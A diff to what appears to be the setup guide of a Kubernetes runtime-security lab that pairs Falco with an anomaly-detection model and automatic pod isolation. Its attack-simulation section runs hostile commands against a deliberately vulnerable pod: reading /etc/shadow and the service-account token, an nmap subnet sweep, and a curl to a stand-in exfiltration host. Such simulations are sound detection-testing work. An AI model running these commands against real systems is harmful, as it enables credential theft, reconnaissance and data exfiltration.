@@ -170,16 +170,18 @@ kubectl apply -f infrastructure/k8s/namespace.yaml
 ```
 
 ### 5.2 Deploy Intentionally Vulnerable Microservices (Testbed)
+The testbed includes 3 tiers: `web-frontend` (Nginx), `api-backend` (Python Flask HTTP), and `redis-cache` (Redis):
 ```bash
 kubectl apply -f infrastructure/k8s/vulnerable-app/
 
-# Wait for pods to be Running
-kubectl get pods -n aiops-security -w
+# Wait for testbed pods to be Running
+kubectl get pods -n aiops-security -l app=vulnerable-testbed -w
 ```
 
-### 5.3 Deploy Falco Runtime Monitor via Helm (eBPF Driver)
-Falco intercepts kernel system calls inside containers using modern eBPF probes.
+### 5.3 Deploy Falco Runtime Monitor (eBPF Driver)
+Falco intercepts kernel system calls inside containers using modern eBPF probes. You can deploy Falco using either **Helm** or the **included Kubernetes manifests**:
 
+#### Option A: Deploy via Helm (Official Chart)
 ```bash
 # Add Falco Helm repo
 helm repo add falcosecurity https://falcosecurity.github.io/charts
@@ -194,8 +196,20 @@ helm install falco falcosecurity/falco \
   --set json_include_output_property=true \
   --set http_output.enabled=false
 
+# Apply custom detection rules tailored to the testbed
+kubectl apply -f infrastructure/k8s/falco/falco-config.yaml
+
 # Wait for Falco DaemonSet pod to become ready
 kubectl get pods -n aiops-security -l app.kubernetes.io/name=falco -w
+```
+
+#### Option B: Deploy via Project Manifests
+```bash
+# Deploys preconfigured Falco DaemonSet with custom rules ConfigMap
+kubectl apply -f infrastructure/k8s/falco/
+
+# Wait for Falco DaemonSet pod to become ready
+kubectl get pods -n aiops-security -l app=falco -w
 ```
 
 ---
@@ -207,13 +221,17 @@ To run the live closed loop, open **3 terminal windows**:
 ### Terminal 1: Webhook Response Server (with live K8s enforcement)
 ```bash
 source .venv/bin/activate
-export DRY_RUN="false"
-export CONFIDENCE_THRESHOLD="0.80"
-export MODEL_DIR="models/autoencoder"
 
-python response_engine/webhook_server.py --port 5000 --host 0.0.0.0
+# Option 1: Using CLI flags
+python response_engine/webhook_server.py --port 5000 --host 0.0.0.0 --model-dir models/autoencoder --no-dry-run
+
+# Option 2: Using environment variables
+# export DRY_RUN="false"
+# export CONFIDENCE_THRESHOLD="0.80"
+# export MODEL_DIR="models/autoencoder"
+# python response_engine/webhook_server.py --port 5000 --host 0.0.0.0
 ```
-*Output should show:* `Loaded in-cluster or kubeconfig... ML Pipeline initialized`.
+*Output should show:* `Starting webhook server on 0.0.0.0:5000`, `Dry-run mode: False`, `Model directory: models/autoencoder`.
 
 ---
 
@@ -221,9 +239,13 @@ python response_engine/webhook_server.py --port 5000 --host 0.0.0.0
 ```bash
 source .venv/bin/activate
 
-# Stream live container syscall logs directly through the normalizer to the Webhook API
+# For Helm installation:
 kubectl logs -l app.kubernetes.io/name=falco -n aiops-security --follow --tail=0 | \
-  python infrastructure/telemetry/log_aggregator.py --stdin --forward-url http://localhost:5000/api/v1/event
+  python infrastructure/telemetry/log_aggregator.py --stdin --forward-url http://localhost:5000/api/v1/event --output unified_telemetry.jsonl
+
+# (If using Option B direct manifests, replace the selector with -l app=falco):
+# kubectl logs -l app=falco -n aiops-security --follow --tail=0 | \
+#   python infrastructure/telemetry/log_aggregator.py --stdin --forward-url http://localhost:5000/api/v1/event --output unified_telemetry.jsonl
 ```
 
 ---
@@ -233,7 +255,7 @@ kubectl logs -l app.kubernetes.io/name=falco -n aiops-security --follow --tail=0
 # Serve frontend dashboard at http://localhost:3333
 npx -y serve dashboard -l 3333
 ```
-Open **`http://localhost:3333`** in your browser. You will see the live SOC Dashboard showing cluster entities.
+Open **`http://localhost:3333`** in your browser. You will see the live SOC Dashboard displaying cluster pods, real-time alert feed, and isolation status.
 
 ---
 
@@ -243,7 +265,8 @@ Open **Terminal 4** to execute runtime attacks against the testbed container:
 
 ### Get Target Pod Name
 ```bash
-TARGET_POD=$(kubectl get pods -n aiops-security -l app=vulnerable-app -o jsonpath="{.items[0].metadata.name}")
+# Select the vulnerable api-backend pod
+TARGET_POD=$(kubectl get pods -n aiops-security -l component=api-backend -o jsonpath="{.items[0].metadata.name}")
 echo "Target Vulnerable Pod: $TARGET_POD"
 ```
 
@@ -257,9 +280,9 @@ kubectl exec -it $TARGET_POD -n aiops-security -- /bin/bash
 ```
 *What happens:*
 1. Falco immediately flags the unexpected terminal spawn syscall (`execve`).
-2. Log aggregator extracts features and forwards to `/api/v1/event`.
+2. Log aggregator normalizes the alert and forwards it to `/api/v1/event`.
 3. Autoencoder flags high reconstruction error ($MSE > \text{threshold}$).
-4. Anomaly mapped to `T1609`.
+4. Anomaly is mapped to `T1609`.
 5. Webhook Server creates `aiops-isolate-<pod-name>` NetworkPolicy.
 6. The container network is instantly cut!
 
@@ -270,8 +293,8 @@ Inside the container shell (or via exec):
 MITRE ATT&CK: **T1552.001 (Credentials in Files)**
 
 ```bash
-cat /etc/shadow
-cat /var/run/secrets/kubernetes.io/serviceaccount/token
+kubectl exec -it $TARGET_POD -n aiops-security -- cat /etc/shadow
+kubectl exec -it $TARGET_POD -n aiops-security -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
 ```
 
 ---
@@ -280,8 +303,9 @@ cat /var/run/secrets/kubernetes.io/serviceaccount/token
 MITRE ATT&CK: **T1046 (Network Service Discovery)**
 
 ```bash
-apt-get update && apt-get install -y nmap
-nmap -sP 10.244.0.0/24
+kubectl exec -it $TARGET_POD -n aiops-security -- apt-get update
+kubectl exec -it $TARGET_POD -n aiops-security -- apt-get install -y nmap
+kubectl exec -it $TARGET_POD -n aiops-security -- nmap -sP 10.244.0.0/24
 ```
 
 ---
@@ -290,7 +314,7 @@ nmap -sP 10.244.0.0/24
 MITRE ATT&CK: **T1041 (Exfiltration Over C2 Channel)**
 
 ```bash
-curl -m 3 http://203.0.113.10:9999/exfil_data
+kubectl exec -it $TARGET_POD -n aiops-security -- curl -m 3 http://203.0.113.10:9999/exfil_data
 ```
 
 ---
@@ -306,7 +330,7 @@ kubectl get networkpolicy -n aiops-security
 *Expected Output:*
 ```
 NAME                               POD-SELECTOR                                      AGE
-aiops-isolate-vulnerable-app-xxx   statefulset.kubernetes.io/pod-name=vulnerable...   15s
+aiops-isolate-api-backend-xxx      statefulset.kubernetes.io/pod-name=api-backend...  15s
 ```
 
 ### 2. Inspect the Generated Policy Rules
@@ -332,7 +356,7 @@ Once the incident investigation is complete, remove the quarantine policy:
 # Option A: Via Python API
 python -c "
 from response_engine.network_policy_manager import NetworkPolicyManager
-npm = NetworkPolicyManager()
+npm = NetworkPolicyManager(dry_run=False)
 npm.rollback_isolation('$TARGET_POD', 'aiops-security')
 "
 
@@ -342,18 +366,31 @@ kubectl delete networkpolicy aiops-isolate-$TARGET_POD -n aiops-security
 
 ---
 
-## 10. Troubleshooting & Quick Fixes
+## 10. Verification & Test Suite Execution
+
+Run the complete test suite to verify ML models, preprocessing, feature extraction, API routes, and isolation logic:
+
+```bash
+source .venv/bin/activate
+pytest tests/ -v
+```
+
+---
+
+## 11. Troubleshooting & Quick Fixes
 
 | Issue | Root Cause | Solution |
 |---|---|---|
 | `Falco pod CrashLoopBackOff` | Linux kernel headers missing or eBPF probe not loaded | Run `sudo apt-get install -y linux-headers-$(uname -r)` and ensure Minikube uses `--driver=docker`. |
-| `NetworkPolicy not blocking packets` | Minikube was started without CNI support | Delete and restart cluster with `--cni=calico`: `minikube delete && minikube start --cni=calico`. |
+| `NetworkPolicy not blocking packets` | Minikube was started without CNI support | Delete and restart cluster with Calico: `minikube delete && minikube start --cni=calico`. |
+| `TARGET_POD variable is empty` | Incorrect pod label selector | Use `-l component=api-backend` or `-l app=vulnerable-testbed`. |
 | `Cannot connect to K8s API from Webhook Server` | Kubeconfig not found in current shell | Run `export KUBECONFIG=~/.kube/config` and verify `kubectl get nodes`. |
 | `Dashboard not showing alerts` | CORS or Webhook server not running on port 5000 | Check `curl http://localhost:5000/api/v1/status` to ensure API returns HTTP 200. |
+| `log_aggregator unrecognized arguments` | Outdated log_aggregator script | Ensure `log_aggregator.py` has `--forward-url` support. |
 
 ---
 
-## 11. Teardown / Cleanup
+## 12. Teardown / Cleanup
 
 To stop and remove all local Kubernetes resources:
 
